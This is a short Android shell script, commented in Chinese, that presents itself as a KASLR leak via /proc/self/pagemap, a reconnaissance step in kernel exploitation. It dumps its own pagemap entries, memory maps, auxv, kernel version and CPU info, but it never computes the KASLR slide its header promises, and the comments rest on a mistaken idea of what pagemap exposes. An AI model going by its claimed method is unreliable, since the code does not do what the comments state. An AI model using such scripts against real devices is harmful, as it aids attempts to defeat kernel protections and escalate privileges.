#!/system/bin/sh
# pagemap_kaslr_leak.sh
# 通过 /proc/self/pagemap 找到内核直接映射区的物理地址
# 然后用 kallsyms 偏移算出当前 KASLR slide
#
# 原理：
# 1. 内核直接映射区把所有物理内存映射到虚拟地址 0xffffff8000000000+
# 2. 物理地址 0x00210000（内核加载地址）→ 虚拟地址 0xffffff8000210000
# 3. 通过读 /proc/self/pagemap 找到这个虚拟地址对应的物理页帧号
# 4. 如果能读到有效的物理页帧号，就可以算出当前 KASLR slide

echo "=== PAGEMAP KASLR LEAK ==="
echo "PID: $$"
echo ""

# 读取 /proc/self/pagemap 的前几个条目
# pagemap 格式：每个虚拟页对应 8 字节
# bit 63: page present
# bit 0-54: physical page frame number (PFN)

# 尝试读取 pagemap
echo "=== Reading /proc/self/pagemap ==="
dd if=/proc/self/pagemap bs=8 count=16 2>/dev/null | od -A x -t x1 -v | head -20
echo ""

# 尝试读取 /proc/self/maps 中的内核相关映射
echo "=== Checking /proc/self/maps for kernel mappings ==="
grep -E "vdso|vvar|stack" /proc/self/maps 2>/dev/null | head -5
echo ""

# 尝试通过 /proc/pid/pagemap 找到 vDSO 的物理地址
# vDSO 通常映射在用户空间，但它的内容来自内核
echo "=== vDSO info ==="
cat /proc/self/auxv 2>/dev/null | od -A x -t x8 -v | head -10
echo ""

# 尝试读取 /proc/version 获取内核版本信息
echo "=== Kernel version ==="
cat /proc/version 2>/dev/null
echo ""

# 尝试读取 /proc/cpuinfo 获取 CPU 信息
echo "=== CPU info (first 5 lines) ==="
head -5 /proc/cpuinfo 2>/dev/null
echo ""

echo "=== DONE ==="
